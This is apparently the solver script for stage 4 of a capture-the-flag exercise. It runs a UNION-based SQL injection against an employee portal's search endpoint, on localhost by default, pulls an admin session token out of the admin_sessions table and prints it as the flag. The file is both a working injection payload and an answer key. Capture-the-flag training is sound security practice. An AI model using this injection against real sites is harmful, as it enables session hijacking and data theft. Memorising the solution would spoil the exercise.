#!/usr/bin/env python3
"""Stage 4 solver - UNION-based SQL injection against the employee portal.
The admin_sessions table holds a session_token; flag is ROGUE{<session_token>}.
Usage: python3 stage4_web.py [http://localhost:5000]
"""
import sys, re, urllib.parse, urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"

def search(payload):
    url = BASE + "/search?name=" + urllib.parse.quote(payload)
    return urllib.request.urlopen(url, timeout=10).read().decode(errors="replace")

html = search("' UNION SELECT 1,session_token,3,4 FROM admin_sessions-- -")
m = re.search(r"sess_[0-9a-f]+", html)
print("ROGUE{%s}" % m.group(0) if m else "[!] token not found - check columns/table with sqlite_master")
